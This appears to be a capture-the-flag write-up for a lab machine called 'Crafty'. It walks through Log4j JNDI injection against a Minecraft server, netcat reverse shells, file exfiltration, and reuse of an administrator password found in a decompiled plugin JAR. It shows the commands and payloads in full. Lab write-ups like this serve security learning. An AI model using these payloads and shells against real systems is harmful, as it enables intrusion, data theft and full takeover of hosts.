## Crafty

### Lab Details 

- Difficulty: Easy
- Type: Web app, Minecraft, Log4j, Java Decode, Windows

#### Enumeration
- nmap
```
PORT      STATE SERVICE   REASON  VERSION
80/tcp    open  http      syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://crafty.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
25565/tcp open  minecraft syn-ack Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
```
- investigate port 80 (http://crafty.htb)
	- upon visit mentions `play.craft.htb`, add to `/etc/hosts`
	- visit `play.craft.htb` redirects to home page of `crafty.htb`
	- enumerate directories
		- didnt find anything useful
	- enumerate subdomains
		- didnt find anything useful
#### Initial Foothold 
- search for `Minecraft 1.16.5` vulnerabilities found post: https://www.minecraft.net/en-us/article/important-message--security-vulnerability-java-edition
- this version of `Minecraft` uses a vulnerable version of `log4j`
- to test out this vulnerability we will need a `Minecraft` client that's compatible with this version of `Minecraft`, download here: https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20231120-231/MinecraftClient-20231120-233-linux-x64
- connect to server via the client
```
$ ./MinecraftClient-20231011-230-linux-x64 username "" 10.10.11.249
Minecraft Console Client v1.20.1 - for MC 1.4.6 to 1.20.1 - Github.com/MCCTe
GitHub build 230, built on 2023-10-11 from commit 1aea8d3
A new version of MCC is available and you can download it via /upgrade
Or download it manually: https://github.com/MCCTeam/Minecraft-Console-Client
Password(invisible): 
You chose to run in offline mode.
Retrieving Server Info...
Server version : 1.16.5 (protocol v754)
[MCC] Version is supported.
Logging in... 
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
```
- we can use tool like https://github.com/veracode-research/rogue-jndi to attempt exploit the vulnerability 
- as stated from the `github` page 
```
The project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.
In order to perform an attack, you can start these servers locally and then trigger a JNDI resolution on the vulnerable client, e.g.:

InitialContext.doLookup("ldap://your_server.com:1389/o=reference");
It will initiate a connection from the vulnerable client to the local LDAP server. Then, the local server responds with a malicious entry containing one of the payloads, that can be useful to achieve a Remote Code Execution.
```
- it act as an LDAP & HTTP server and when a connection from the vulnerable client local server responds with a malicious entry containing the payloads
- set up the tool
```
## install maven and jdk if haven't already
$ sudo apt install maven openjdk-11-jdk -y

## get the tool
$ git clone https://github.com/veracode-research/rogue-jndi.git
$ cd rogue-jndi

## install the tool
mvn package

## running the tool
## starts a fake LDAP server
## The server is configured to return a malicious Java object when a victim connects.
$ java -jar target/RogueJndi-1.1.jar --command "powershell.exe iwr
http://10.10.16.22:8080/nc64.exe -O c:\windows\temp\nc64.exe;
c:\windows\temp\nc64.exe 10.10.16.22 4444 -e cmd.exe" --hostname "10.10.16.22"

## start up a nc listener
$ nc -lvnp 4444  

##  Log4j logs a malicious string, enter in the Minecraft client
##  might take a couple tries to get a shell
/send ${jndi:ldap://10.10.16.22:1389/o=reference}

## connection in nc listener
$ nc -lvnp 4444                                    
listening on [any] 4444 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.11.249] 49685
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\users\svc_minecraft\server>whoami
whoami
crafty\svc_minecraft 
```

#### Lateral Movement (If any)

#### Privilege Escalation
- searching through the directories found `playercounter-1.0-SNAPSHOT.jar`
```
c:\Users\svc_minecraft\server\plugins>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users\svc_minecraft\server\plugins

10/27/2023  02:48 PM    <DIR>          .
10/27/2023  02:48 PM    <DIR>          ..
10/27/2023  02:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
               1 File(s)          9,996 bytes
               2 Dir(s)   3,600,453,632 bytes free

```
- transfer the file to attacker host
```bash
## start nc listener on attacker
$ nc -lvnp 4444

## load nc.exe to remote 
PS C:\Users\svc_minecraft> Invoke-WebRequest -Uri "http://10.10.16.22:8080/nc64.exe" -OutFile "./nc.exe"
Invoke-WebRequest -Uri "http://10.10.16.22:8080/nc64.exe" -OutFile "./nc.exe"
## transfer the file 
PS C:\Users\svc_minecraft> cmd
cmd
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\svc_minecraft>nc.exe 10.10.16.22 4444 < "C:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar"
nc.exe 10.10.16.22 4444 < "C:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar"

## receiving the file on attacker host
$ nc -lvnp 4444 > playercounter-1.0-SNAPSHOT.jar

listening on [any] 4444 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.11.249] 49698
```
- dearchive the `JAR` file 
```
$ unzip playercounter-1.0-SNAPSHOT.jar -d ./playercounter-1.0-SNAPSHOT
```
- get `jd-gui` to analyse the class file
![[class file.png]]
- there is a string in the file and we can attempt to reuse the credential and attempt to escalate privilege 
- get `runas` 
```
$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
```
- prepare the payload, `shell.bat`
```
@echo on
c:\windows\temp\nc64.exe 10.10.14.48 4444 -e cmd.exe
```
- `runas` administrator
```
PS C:\Users\svc_minecraft> .\RunasCs.exe -l 2 administrator s67u84zKq8IXw "c:\Users\svc_minecraft\shell.bat"
.\RunasCs.exe -l 2 administrator s67u84zKq8IXw "c:\Users\svc_minecraft\shell.bat
```
- shell back as `crafty\administrator`
```
$ nc -lvvnp 4444        
listening on [any] 4444 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.11.249] 49693
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
crafty\administrator
```

#### Resources

#### Lesson Learned
- JDNI and Rouge JDNI 
- Log4j
